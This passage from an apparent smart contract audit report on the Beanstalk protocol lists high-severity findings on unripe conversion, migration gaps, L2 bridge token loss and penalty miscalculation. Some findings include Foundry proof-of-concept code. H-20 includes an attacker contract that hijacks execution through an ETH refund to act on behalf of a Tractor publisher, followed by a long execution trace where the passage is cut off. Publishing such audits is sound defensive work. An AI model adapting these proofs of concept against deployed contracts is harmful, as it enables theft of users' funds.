    ) internal returns (address tokenOut, address tokenIn, uint256 amountOut, uint256 amountIn) {
        tokenOut = C.UNRIPE_BEAN;
        tokenIn = C.UNRIPE_LP;
        (uint256 lp, uint256 minBeans) = convertData.basicConvert();
        uint256 minAmountOut = LibUnripe
            .unripeToUnderlying(tokenOut, minBeans, IBean(C.UNRIPE_BEAN).totalSupply())
@>          .mul(LibUnripe.percentLPRecapped())
            .div(LibUnripe.percentBeansRecapped());
        (uint256 outUnderlyingAmount, uint256 inUnderlyingAmount) = LibWellConvert
            ._wellRemoveLiquidityTowardsPeg(
                LibUnripe.unripeToUnderlying(tokenIn, lp, IBean(C.UNRIPE_LP).totalSupply()),
                minAmountOut,
                LibBarnRaise.getBarnRaiseWell()
            );

        amountIn = LibUnripe.underlyingToUnripe(tokenIn, inUnderlyingAmount);
        LibUnripe.removeUnderlying(tokenIn, inUnderlyingAmount);
        IBean(tokenIn).burn(amountIn);

        amountOut = LibUnripe
            .underlyingToUnripe(tokenOut, outUnderlyingAmount)
            .mul(LibUnripe.percentBeansRecapped())
@>          .div(LibUnripe.percentLPRecapped());
        LibUnripe.addUnderlying(tokenOut, outUnderlyingAmount);
@@>>    IBean(tokenOut).mint(address(this), amountOut);
    }

    function convertBeansToLP(
        bytes memory convertData
    ) internal returns (address tokenOut, address tokenIn, uint256 amountOut, uint256 amountIn) {
        tokenIn = C.UNRIPE_BEAN;
        tokenOut = C.UNRIPE_LP;
        (uint256 beans, uint256 minLP) = convertData.basicConvert();
        uint256 minAmountOut = LibUnripe
            .unripeToUnderlying(tokenOut, minLP, IBean(C.UNRIPE_LP).totalSupply())
            .mul(LibUnripe.percentBeansRecapped())
@>          .div(LibUnripe.percentLPRecapped());
        (uint256 outUnderlyingAmount, uint256 inUnderlyingAmount) = LibWellConvert
            ._wellAddLiquidityTowardsPeg(
                LibUnripe.unripeToUnderlying(tokenIn, beans, IBean(C.UNRIPE_BEAN).totalSupply()),
                minAmountOut,
                LibBarnRaise.getBarnRaiseWell()
            );

        amountIn = LibUnripe.underlyingToUnripe(tokenIn, inUnderlyingAmount);
        LibUnripe.removeUnderlying(tokenIn, inUnderlyingAmount);
        IBean(tokenIn).burn(amountIn);

        amountOut = LibUnripe
            .underlyingToUnripe(tokenOut, outUnderlyingAmount)
@>          .mul(LibUnripe.percentLPRecapped())
            .div(LibUnripe.percentBeansRecapped());
        LibUnripe.addUnderlying(tokenOut, outUnderlyingAmount);
@@>>    IBean(tokenOut).mint(address(this), amountOut);
    }
```

This issue will at least cause revert after conversion because Penalty was applied due to disbalance. And will at most cause incorrect conversion and as a result a drain of Beanstalk, however I don't have enough time left to investigate such attack vector.

## Impact

Fertilizer will remain mintable when in fact debt is recapitalized. It means all minters of that extra Fertilizer will lose money.

And there is another more severe impact: Unripe Convert won't work because it calculates incorrect price between UnripeBean and UnripeLp.

## Tools Used

Manual Review

## Recommendations

Set `s.sys.fert.recapitalized` in ReseedBarn.sol.

## <a id='H-16'></a>H-16. `s.sys.silo.unripeSettings` are never set after migration which breaks Unripe functionality

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
Reseed contracts are responsible for setting storage variables during migration. Problem is that it forgets to initialize `s.sys.silo.unripeSettings`, i.e. address and balanceOfUnderlying of Unripe tokens. It has several consequences on different modules of Beanstalk

## Vulnerability Details
`s.sys.silo.unripeSettings` are not initialized after migration. All the contracts with migration logic are located in folder `protocol/contracts/beanstalk/init/**`

## Impact
Values `s.sys.silo.unripeSettings` are used throughout a codebase. It has a lot of different impacts:
- Invariable.sol underestimates Bean entitlement
- `EnrootFacet.enrootDeposit()` doesn't work
- Chop logic doesn't work, it means users can't convert Unripe tokens into Ripe tokens
And so on, I don’t see the point in listing everything. However I will add if necessary during post-judging period.

## Tools Used
Manual Review

## Recommendations
Initialize those values.
## <a id='H-17'></a>H-17. Tokens can get stuck during migration if the L2 side fails leading to loss of funds

_Submitted by [holydevoti0n](https://profiles.cyfrin.io/u/undefined), [Uno](https://profiles.cyfrin.io/u/undefined), [golanger85](https://profiles.cyfrin.io/u/undefined). Selected submission by: [golanger85](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

During the mirgration process between `BeanL1ReceiverFacet` and `BeanL2MigrationFacet`, when transactions fail on the L2 side, tokens are forever burnt with no existing method to reclaw them.

## Vulnerability Details

The migration process involves two key contracts: `BeanL1ReceiverFacet` and `BeanL2MigrationFacet`. The process starts on L1 where tokens are burned, and a message is sent to L2 to mint the equivalent amount of tokens.

**Steps Involved:**

1. **Burning on L1:** The `BeanL2MigrationFacet` contract burns the tokens from the user's L1 balance.
2. **Message to L2:** The contract then sends a message to L2 using the `IL2Bridge` interface, instructing the L2 contract to mint the equivalent amount of tokens.

**Vulnerable Scenario:**

* If the message sent from L1 to L2 fails to execute successfully on L2 (e.g., due to contract limitations or gas issues), the tokens will have already been burned on L1, but the user will not receive the corresponding tokens on L2.
* Specifically, the `recieveL1Beans` function on L2 could revert due to various reasons such as exceeding the maximum migrated beans or other contract-specific checks.



```Solidity
function recieveL1Beans(address reciever, uint256 amount) external nonReentrant {
    require(
        msg.sender == address(BRIDGE) &&
        IL2Messenger(BRIDGE).xDomainMessageSender() == L1BEANSTALK
    );
    s.sys.migration.migratedL1Beans += amount;
    require(
        EXTERNAL_L1_BEANS >= s.sys.migration.migratedL1Beans,
        "L2Migration: exceeds maximum migrated"
    );
    C.bean().mint(reciever, amount);
}

```

```Solidity
function migrateL2Beans(
    address reciever,
    address L2Beanstalk,
    uint256 amount,
    uint32 gasLimit
) external nonReentrant {
    C.bean().burnFrom(msg.sender, amount);

    IL2Bridge(BRIDGE).sendMessage(
        L2Beanstalk,
        abi.encodeCall(IBeanL1RecieverFacet(L2Beanstalk).recieveL1Beans, (reciever, amount)),
        gasLimit
    );
}

```

## Impact

If a migration request causes the total migrated beans to exceed this limit, the `recieveL1Beans` function will revert with the error "L2Migration: exceeds maximum migrated". Additionally, if the specified gas limit (`gasLimit`) is too low, the transaction might run out of gas during execution on L2.

Users will permanently lose their tokens as they are burned on L1 but not minted on L2.

## Tools Used

Manual Review

## Recommendation

It is recommended to comprise a refund/reclaw mechanism for failed transactions on L2, so that tokens can be retrieved.

By implementing a retry mechanism and tracking migration requests, the potential issue of tokens getting stuck during the L1 to L2 migration can be mitigated. This approach ensures that users do not lose their tokens even if there are issues during the migration process.

```Solidity
function recieveL1Beans(address reciever, uint256 amount) external nonReentrant {
    require(
        msg.sender == address(BRIDGE) &&
        IL2Messenger(BRIDGE).xDomainMessageSender() == L1BEANSTALK
    );
    s.sys.migration.migratedL1Beans += amount;
    require(
        EXTERNAL_L1_BEANS >= s.sys.migration.migratedL1Beans,
        "L2Migration: exceeds maximum migrated"
    );
    C.bean().mint(reciever, amount);

    // Mark the migration as completed on L1
    bytes32 requestId = keccak256(abi.encodePacked(reciever, amount, block.timestamp));
    IL2Bridge(BRIDGE).sendMessage(
        L1Beanstalk,
        abi.encodeCall(BeanL2MigrationFacet(L1Beanstalk).markMigrationCompleted, (requestId)),
        gasLimit
    );
}

```

```Solidity
mapping(bytes32 => MigrationRequest) public migrationRequests;

struct MigrationRequest {
    address reciever;
    uint256 amount;
    uint256 timestamp;
    bool completed;
}

function migrateL2Beans(
    address reciever,
    address L2Beanstalk,
    uint256 amount,
    uint32 gasLimit
) external nonReentrant {
    C.bean().burnFrom(msg.sender, amount);

    bytes32 requestId = keccak256(abi.encodePacked(reciever, amount, block.timestamp));
    migrationRequests[requestId] = MigrationRequest(reciever, amount, block.timestamp, false);

    IL2Bridge(BRIDGE).sendMessage(
        L2Beanstalk,
        abi.encodeCall(IBeanL1RecieverFacet(L2Beanstalk).recieveL1Beans, (reciever, amount)),
        gasLimit
    );
}

function refundFailedMigration(bytes32 requestId) external {
    MigrationRequest storage request = migrationRequests[requestId];
    require(!request.completed, "Migration already completed");
    require(block.timestamp > request.timestamp + 1 days, "Migration still in process");

    C.bean().mint(request.reciever, request.amount);
    request.completed = true;
}

```

## <a id='H-18'></a>H-18. Unfair Penalty Fees in Pipeline Convert

_Submitted by [holydevoti0n](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The Pipeline Convert will penalize users contributing towards the peg before the conversion capacity is fully reached. This happens because:

In `LibConvert`, the `cumulativePenalty` for the Well uses the current `cappedReservesDeltaB` value, which is read from the well's pump.

```solidity
    function calculatePerWellCapacity(
        address wellToken,
        uint256 amountInDirectionOfPeg,
        uint256 cumulativePenalty,
        ConvertCapacity storage convertCap,
        uint256 pdCapacityToken
    ) internal view returns (uint256, uint256) {
@>        uint256 tokenWellCapacity = abs(LibDeltaB.cappedReservesDeltaB(wellToken)); // @audit new deltaB. i.e: 0
        pdCapacityToken = convertCap.wellConvertCapacityUsed[wellToken].add(amountInDirectionOfPeg); // @audit user contributed towards peg. value: 400
        if (pdCapacityToken > tokenWellCapacity) { // @audit 400 > 0
@>            cumulativePenalty = cumulativePenalty.add(pdCapacityToken.sub(tokenWellCapacity)); //@audit user got an unfair penalty fee of 400 when it should be 0. 
        }


        return (cumulativePenalty, pdCapacityToken);
    }
```

If the timestamp of the transaction is greater than the last time the well reserves were updated when the user applies the advanced farm calls, Basin will:

* Update the reserves.
* Save the `lastTimestamp` as the current `block.timestamp`.

`If readCappedReserves is called again in the same transaction, it will return the freshly updated reserves that the user just updated.`

[MultiflowPump from Basin](https://github.com/Cyfrin/2024-04-Beanstalk-DIB/blob/038609d8adf1bf941f8abd12820bc92ecd998375/src/pumps/MultiFlowPump.sol#L202-L205)

```solidity
    function readCappedReserves(
        address well,
        bytes calldata data
    ) external view returns (uint256[] memory cappedReserves) {
        (, uint256 capInterval, CapReservesParameters memory crp) =
            abi.decode(data, (bytes16, uint256, CapReservesParameters));
        bytes32 slot = _getSlotForAddress(well);
        uint256[] memory currentReserves = IWell(well).getReserves();
        uint8 numberOfReserves;
        uint40 lastTimestamp;
        (numberOfReserves, lastTimestamp, cappedReserves) = slot.readLastReserves();
        if (numberOfReserves == 0) {
            revert NotInitialized();
        }
@>        uint256 deltaTimestamp = _getDeltaTimestamp(lastTimestamp);
@>        if (deltaTimestamp == 0) {
@>            return cappedReserves;
@>        }


        uint256 capExponent = calcCapExponent(deltaTimestamp, capInterval);
        cappedReserves = _capReserves(well, cappedReserves, currentReserves, capExponent, crp);
    }
```

The issue occurs in the following scenario:

1. User calls PipelineConvertFacet -> pipelineConvert.
2. User applies advanced farm calls, changing the Well reserves towards the peg.
3. Basin updates the reserves to match the current state (when within the max cap).
4. When applying the penalty fee per Well, the code reads from cappedReserves again.

Example:

* Previous Well deltaB: -400

* User executes advanced farm calls

* Current deltaB for Well capped reserves: 0

When calculating the penalty fee, the user will be charged for the value they contributed towards the peg, even though they did not surpass the conversion capacity.

## PoC

Insert the code below into `PipelineConvertTest`.

```solidity
function testCalculateStalkPenalty_applyWrongFee() public {
        addEthToWell(users[1], 1 ether);
        addBeansToWell(users[1], 1000e6);
    
        addBeansToWell(users[1], 99);
        addBeansToWell(users[1], 100); // -100 deltaB

        // cappedReserves after advanced farm calls moves from -100 to 0.
        addEthToWell(users[1], 2e11);

        int256 tokenWellCapacity = LibDeltaB.cappedReservesDeltaB(beanEthWell);
        console.log("tokenWellCapacity before");
        printCappedDeltaB(tokenWellCapacity);

        updateMockPumpUsingWellReserves(beanEthWell);

        LibConvert.DeltaBStorage memory dbs;
        dbs.beforeOverallDeltaB = -100;
        dbs.afterOverallDeltaB = 0;
        dbs.beforeInputTokenDeltaB = -100;
        dbs.afterInputTokenDeltaB = 0;
        dbs.beforeOutputTokenDeltaB = 0;
        dbs.afterOutputTokenDeltaB = 0;

        uint256 bdvConverted = IERC20(beanEthWell).balanceOf(users[1]);
        uint256 overallCappedDeltaB = 100;
        address inputToken = beanEthWell;
        address outputToken = C.BEAN;

        // print deltaB
        console.log("tokenWellCapacity after ");
        tokenWellCapacity = LibDeltaB.cappedReservesDeltaB(beanEthWell);
        printCappedDeltaB(tokenWellCapacity);

        (uint256 penalty, , , ) = LibConvert.calculateStalkPenalty(
            dbs,
            bdvConverted,
            overallCappedDeltaB,
            inputToken,
            outputToken
        );

        assertEq(penalty, 0, "User1 shouldn't pay any fee");
    }

    function addBeansToWell(address user, uint256 amount) public returns (uint256 lpAmountOut) {
        MockToken(C.BEAN).mint(user, amount);

        vm.prank(user);
        MockToken(C.BEAN).approve(beanEthWell, amount);

        uint256[] memory tokenAmountsIn = new uint256[](2);
        tokenAmountsIn[0] = amount;
        tokenAmountsIn[1] = 0;

        vm.prank(user);
        lpAmountOut = IWell(beanEthWell).addLiquidity(tokenAmountsIn, 0, user, type(uint256).max);

        // approve spending well token to beanstalk
        vm.prank(user);
        MockToken(beanEthWell).approve(BEANSTALK, type(uint256).max);
    }

    function printCappedDeltaB(int256 deltaB) internal { 
        if (deltaB < 0) { 
            console.log("- cappedDeltaB: %d", LibConvert.abs(deltaB));
        } else { 
            console.log("+ cappedDeltaB: %d", LibConvert.abs(deltaB));
        }
    }
```

Run: `forge test --match-test testCalculateStalkPenalty_applyWrongFee -vv`

Output:

```Solidity
 tokenWellCapacity before
  - cappedDeltaB: 100
  tokenWellCapacity after 
  + cappedDeltaB: 0
Failing tests:
Encountered 1 failing test in test/foundry/PipelineConvert.t.sol:PipelineConvertTest
[FAIL. Reason: User1 shouldn't pay any fee: 100 != 0] testCalculateStalkPenalty_applyWrongFee() (gas: 610008)

Encountered a total of 1 failing tests, 0 tests succeeded
```

## Impact

* Users contributing to maintaining the peg will incur a full penalty based on their contribution. For example, if the deltaB changes from -400 to 0, the user will pay a penalty of 400.

* Beanstalk will discourage users from helping to maintain the peg's stability.

## Tools Used

Manual Review and Foundry.

## Recommendations

The `LibDeltaB.cappedReservesDeltaB` per Well should be read before the advanced farm calls and then passed as a parameter to `LibConvert.applyStalkPenalty` until it reaches `calculatePerWellCapacity`.

```diff
    function calculatePerWellCapacity(
        address wellToken,
        uint256 amountInDirectionOfPeg,
        uint256 cumulativePenalty,
        ConvertCapacity storage convertCap,
        uint256 pdCapacityToken,
+      uint256 tokenWellCapacity
    ) internal view returns (uint256, uint256) {
-      uint256 tokenWellCapacity = abs(LibDeltaB.cappedReservesDeltaB(wellToken));
        pdCapacityToken = convertCap.wellConvertCapacityUsed[wellToken].add(amountInDirectionOfPeg);
        if (pdCapacityToken > tokenWellCapacity) {
            cumulativePenalty = cumulativePenalty.add(pdCapacityToken.sub(tokenWellCapacity));
        }


        return (cumulativePenalty, pdCapacityToken);
    }
```

## <a id='H-19'></a>H-19. `ReseedSilo` does not set the necessary user variables

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
`ReseedSilo` does not set the necessary user variables

## Vulnerability Details
When user deposits are migrated via `ReseedSilo`, user's storage variables such as `lastUpdated`, `lastSop` and `lastRain` are not set accordingly.

As these values would remain 0, this would allow users for unfair amounts of `plenty`

## Impact
Loss of funds

## Tools Used
Manual review


## Recommendations
Set the necessary variables accordingly.
## <a id='H-20'></a>H-20. Refunding ETH to the caller can be exploited using the Tractor component to call any arbitrary function on behalf of the publisher

_Submitted by [Draiakoo](https://profiles.cyfrin.io/u/undefined), [asefewwexa](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Draiakoo](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The usage of certain function via tractor blueprints can give the executor of the blueprint complete control of the publisher's position in the protocol

## Relevant GitHub Links:
https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Token/LibEth.sol#L18
https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/farm/TractorFacet.sol#L46-L61

## Vulnerability Details

The tractor component is meant to execute operations inside the Beanstalk protocol on behalf of a publisher. That means that a user can ONLY execute those functions that the publisher exclusively allowed him to execute. This feature should not enable someone to execute any arbitrary function. However, there are specific functions that can enable a user to execute any arbitrary function on the protocol on behalf of the publisher that he has not allowed to execute.
These function have a particularity, return eth to the caller. Specifically executes the `refundEth` function:

```Solidity
    function refundEth() internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
        if (address(this).balance > 0 && s.sys.isFarm != 2) {
            (bool success, ) = msg.sender.call{value: address(this).balance}(new bytes(0));
            require(success, "Eth transfer Failed.");
        }
    }
```

This function basically tries to send the remaning ETH in the Beanstalk contract to the msg.sender. When the contract sends ETH to the caller it will pass the transaction execution to the msg.sender.
The main problem here is that when someone is executing one of the functions that refunds ETH on behalf of a publisher, he will gain the transaction execution and will have the hability to call any arbitrary function inside the Beanstalk contract on behalf of the publisher without being allowed to. That's because the `activePublisher` will expire once all the functions that the publisher allowed to execute ends. So if the ETH refund is executed in the middle of one of these transactions, the attacker will have the `activePublisher` set to the victim and the transaction execution to call any arbitrary funcion on behalf of the publisher.

The list of functions that make this exploit possible are:

```Solidity
DepotFacet::advancedPipe
DepotFacet::etherPipe
TokenFacet::wrapEth
L1TokenFacet::wrapEth
FarmFacet::farm
FarmFacet::advancedFarm
```

Proof of concept:
In this Proof of Concept I created a function to fetch the active publisher and did not executed any attack to Alice, just demonstrated that Bob got the transaction execution where he can execute any arbitrary function on behalf of Alice.
This test uses the `Field.t.sol` setup:

```Solidity
    function test_blueprintHackPOC() public {
        // Get alice private key to sign the EIP712
        uint256 alicePrivateKey = 0xa11ce;
        address alice = vm.addr(alicePrivateKey);
        address bob = makeAddr("bob");

        // In this example, we will be using the example of the function FarmFacet::farm()
        // The function that farm will be performing is beanSown(). In this context
        // makes no sense to call this function but this is secondary, I made it simple
        // for testing purposes. Here would be a series of publisher determined functions
        // to call.
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodeWithSignature("beanSown()");

        // Wrap the function to call inside the "FarmFacet::farm" function. This is the
        // function that will refund the ETH to the caller
        AdvancedFarmCall[] memory advancedCalls = new AdvancedFarmCall[](1);
        advancedCalls[0] = AdvancedFarmCall({
            callData: abi.encodeWithSignature("farm(bytes[])", datas),
            clipboard: ""
        });
        
        bytes memory tractorData = abi.encodePacked(bytes4(0x00000000), abi.encode(advancedCalls));

        // Alice creates a blueprint for anybody to execute it on her behalf
        LibTractor.Blueprint memory blueprint = LibTractor.Blueprint({
            publisher: alice,
            data: tractorData,
            operatorPasteInstrs: new bytes32[](0),
            maxNonce: type(uint256).max,
            startTime: block.timestamp - 1,
            endTime: block.timestamp + 10000
        });

        bytes32 blueprintHash = diamond.getBlueprintHash(blueprint);
        bytes32 hashToSign = MessageHashUtils.toEthSignedMessageHash(blueprintHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePrivateKey, hashToSign);
        bytes memory signature = abi.encodePacked(r, s, v);

        LibTractor.Requisition memory requisition = LibTractor.Requisition({
            blueprint: blueprint,
            blueprintHash: blueprintHash,
            signature: signature
        });

        vm.deal(bob, 1 ether);
        vm.startPrank(bob);
        // Bob creates the attacker contract
        AttackerContract attackContract = new AttackerContract();
        // Bob executes the attack to execute any arbitrary function
        attackContract.startAttack{value: 1 ether}(address(diamond), requisition);
        vm.stopPrank();
    }

contract AttackerContract {

    event GetPublisher(address publisher);

    address public diamond;

    // The attack is initiated by calling the tractor function to be able to execute functions
    // on behalf of the publisher
    function startAttack(address diamondAddress, LibTractor.Requisition memory requisition) public payable{
        diamond = diamondAddress;
        IMockFBeanstalk(diamondAddress).tractor{value: msg.value}(requisition, "");
    }

    // Once Beanstalk refunds ETH to this contract (in the context of the msg.sender), he will
    // be able to execute any arbitrary function on behalf of the publisher even though he
    // should not be able to do.
    fallback() external payable {
        address publisher = IMockFBeanstalk(diamond).getActivePublisher();
        // Emit the publisher to see in the traces that the address of the publisher matches
        // alice's address
        emit GetPublisher(publisher);
        
        // The attack would be executed here
    }
}
```

Traces:

```Solidity
Ran 1 test for test/foundry/field/Field.t.sol:FieldTest
[PASS] test_blueprintHackPOC() (gas: 819393)
Traces:
  [819393] FieldTest::test_blueprintHackPOC()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]
    ├─ [0] VM::label(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e], "bob")
    │   └─ ← [Return]
    ├─ [7558] Beanstalk::getBlueprintHash(Blueprint({ publisher: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, data: 0x000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000a4300dd6cf00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000040b1d541200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, operatorPasteInstrs: [], maxNonce: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], startTime: 997199 [9.971e5], endTime: 1007200 [1.007e6] })) [staticcall]
    │   ├─ [2483] TractorFacet::getBlueprintHash(Blueprint({ publisher: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, data: 0x000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000a4300dd6cf00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000040b1d541200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, operatorPasteInstrs: [], maxNonce: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], startTime: 997199 [9.971e5], endTime: 1007200 [1.007e6] })) [delegatecall]
    │   │   └─ ← [Return] 0xb32087471d4fbcd229ebc9de1783bd29bfe126e12d0914ad879f6824f9fb95fc
    │   └─ ← [Return] 0xb32087471d4fbcd229ebc9de1783bd29bfe126e12d0914ad879f6824f9fb95fc
    ├─ [0] VM::sign("<pk>", 0xba27e71307e1d707434c5274f067e4b63ced79208b46d6c0c2daee19d08baaf0) [staticcall]
    │   └─ ← [Return] 28, 0x85ad827b9568a109fc5d5adee864f36e25b72e74a4294adddd5d598c5643ea42, 0x6626ce289bff1d9cc2527c0634735e7e59166e03dac48e56bf637249bbc03d4d
    ├─ [0] VM::deal(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e], 1000000000000000000 [1e18])
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e])
    │   └─ ← [Return]
    ├─ [357391] → new AttackerContract@0x7f9F2c462d5F83B1a5CE6B80CbD691278Fa4647A
    │   └─ ← [Return] 1785 bytes of code
    ├─ [400873] AttackerContract::startAttack{value: 1000000000000000000}(Beanstalk: [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5], Requisition({ blueprint: Blueprint({ publisher: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, data: 0x000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000a4300dd6cf00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000040b1d541200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, operatorPasteInstrs: [], maxNonce: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], startTime: 997199 [9.971e5], endTime: 1007200 [1.007e6] }), blueprintHash: 0xb32087471d4fbcd229ebc9de1783bd29bfe126e12d0914ad879f6824f9fb95fc, signature: 0x85ad827b9568a109fc5d5adee864f36e25b72e74a4294adddd5d598c5643ea426626ce289bff1d9cc2527c0634735e7e59166e03dac48e56bf637249bbc03d4d1c }))
    │   ├─ [365947] Beanstalk::tractor{value: 1000000000000000000}(Requisition({ blueprint: Blueprint({ publisher: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, data: 0x000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000a4300dd6cf00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000040b1d541200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, operatorPasteInstrs: [], maxNonce: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], startTime: 997199 [9.971e5], endTime: 1007200 [1.007e6] }), blueprintHash: 0xb32087471d4fbcd229ebc9de1783bd29bfe126e12d0914ad879f6824f9fb95fc, signature: 0x85ad827b9568a109fc5d5adee864f36e25b72e74a4294adddd5d598c5643ea426626ce289bff1d9cc2527c0634735e7e59166e03dac48e56bf637249bbc03d4d1c }), 0x)
    │   │   ├─ [363293] TractorFacet::tractor{value: 1000000000000000000}(Requisition({ blueprint: Blueprint({ publisher: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, data: 0x000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000a4300dd6cf00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000040b1d541200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, operatorPasteInstrs: [], maxNonce: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], startTime: 997199 [9.971e5], endTime: 1007200 [1.007e6] }), blueprintHash: 0xb32087471d4fbcd229ebc9de1783bd29bfe126e12d0914ad879f6824f9fb95fc, signature: 0x85ad827b9568a109fc5d5adee864f36e25b72e74a4294adddd5d598c5643ea426626ce289bff1d9cc2527c0634735e7e59166e03dac48e56bf637249bbc03d4d1c }), 0x) [delegatecall]
    │   │   │   ├─ [3000] PRECOMPILES::ecrecover(0xba27e71307e1d707434c5274f067e4b63ced79208b46d6c0c2daee19d08baaf0, 28, 60464173962614186332303462176109042287359479740271240005626956927338423773762, 46204473598528409470120544646691497478798504711195469583190631948092268625229) [staticcall]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000e05fcc23807536bee418f142d19fa0d21bb0cff7
    │   │   │   ├─ emit CancelBlueprint(blueprintHash: 0x0000000000000000000000000000000000000000000000000000000000000001)
    │   │   │   ├─ emit CancelBlueprint(blueprintHash: 0x0000000000000000000000000000000000000000000000000000000000000002)
    │   │   │   ├─ [206016] FarmFacet::farm{value: 1000000000000000000}([0x0b1d5412]) [delegatecall]
    │   │   │   │   ├─ [2326] MockFieldFacet::beanSown{value: 1000000000000000000}() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [4596] AttackerContract::fallback{value: 1000000000000000000}()
    │   │   │   │   │   ├─ [2903] Beanstalk::getActivePublisher() [staticcall]
    │   │   │   │   │   │   ├─ [461] TractorFacet::getActivePublisher() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    │   │   │   │   │   │   └─ ← [Return] 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    │   │   │   │   │   ├─ emit GetPublisher(publisher: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [3769] BEAN/ETH Well::tokens() [staticcall]
    │   │   │   │   │   ├─ [1017] well::tokens() [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] [0xBEA0000029AD1c77D3d5D23Ba2D8893dB9d1Efab, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
    │   │   │   │   │   └─ ← [Return] [0xBEA0000029AD1c77D3d5D23Ba2D8893dB9d1Efab, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
    │   │   │   │   ├─ [1269] BEAN/WSTETH Well::tokens() [staticcall]
    │   │   │   │   │   ├─ [1017] well::tokens() [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] [0xBEA0000029AD1c77D3d5D23Ba2D8893dB9d1Efab, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]
    │   │   │   │   │   └─ ← [Return] [0xBEA0000029AD1c77D3d5D23Ba2D8893dB9d1Efab, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]
    │   │   │   │   ├─ [2714] Bean::balanceOf(Beanstalk: [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
